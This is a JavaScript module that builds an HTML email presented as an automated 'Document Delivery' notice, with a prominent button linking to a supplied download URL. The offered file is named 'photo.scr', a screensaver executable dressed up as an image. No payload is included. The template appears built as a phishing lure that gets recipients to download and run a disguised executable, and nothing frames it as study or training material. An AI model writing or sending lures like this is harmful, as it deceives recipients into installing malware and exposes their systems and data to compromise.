function emailTemplate(downloadUrl) {
    return `
    <!DOCTYPE html>
    <html>
    <body style="
        margin:0;
        padding:30px 10px;
        background:#f3f4f6;
        font-family:Arial,Helvetica,sans-serif;
    ">

        <div style="
            max-width:600px;
            margin:auto;
            background:#ffffff;
            border-radius:10px;
            overflow:hidden;
            border:1px solid #e5e7eb;
        ">

            <div style="
                background:#172554;
                padding:35px 30px;
                color:#ffffff;
            ">
                <p style="
                    margin:0 0 10px;
                    font-size:12px;
                    letter-spacing:2px;
                    color:#bfdbfe;
                ">
                    DOCUMENT DELIVERY
                </p>

                <h1 style="
                    margin:0;
                    font-size:28px;
                    font-weight:700;
                ">
                    Your File is Ready
                </h1>

                <p style="
                    margin:12px 0 0;
                    color:#dbeafe;
                    font-size:14px;
                ">
                    Your requested file is available for download.
                </p>
            </div>

            <div style="padding:35px 30px;">

                <p style="
                    color:#374151;
                    font-size:15px;
                    line-height:1.7;
                ">
                    Hello,
                    <br><br>
                    Your file is ready. Click the button below to
                    download it directly from our server.
                </p>

                <div style="
                    margin:30px 0;
                    padding:22px;
                    background:#f8fafc;
                    border:1px solid #e2e8f0;
                    border-radius:8px;
                ">
                    <p style="
                        margin:0 0 8px;
                        color:#64748b;
                        font-size:12px;
                        text-transform:uppercase;
                        letter-spacing:1px;
                    ">
                        Available Document
                    </p>

                    <p style="
                        margin:0;
                        color:#1e293b;
                        font-size:16px;
                        font-weight:bold;
                    ">
                        photo.scr
                    </p>
                </div>

                <div style="text-align:center;margin:35px 0;">

                    <a href="${downloadUrl}"
                       style="
                           display:inline-block;
                           padding:15px 35px;
                           background:#2563eb;
                           color:#ffffff;
                           text-decoration:none;
                           border-radius:6px;
                           font-size:15px;
                           font-weight:bold;
                       ">
                        Download File
                    </a>

                </div>

                <p style="
                    color:#64748b;
                    font-size:12px;
                    line-height:1.6;
                ">
                    If the button does not work, copy and open this link
                    in your browser:
                    <br>
                    <a href="${downloadUrl}"
                       style="color:#2563eb;word-break:break-all;">
                        ${downloadUrl}
                    </a>
                </p>

            </div>

            <div style="
                background:#f8fafc;
                padding:20px;
                text-align:center;
                border-top:1px solid #e5e7eb;
            ">
                <p style="
                    margin:0;
                    color:#94a3b8;
                    font-size:11px;
                ">
                    This is an automated email. Please do not reply.
                </p>
            </div>

        </div>

    </body>
    </html>
    `;
}

module.exports = emailTemplate;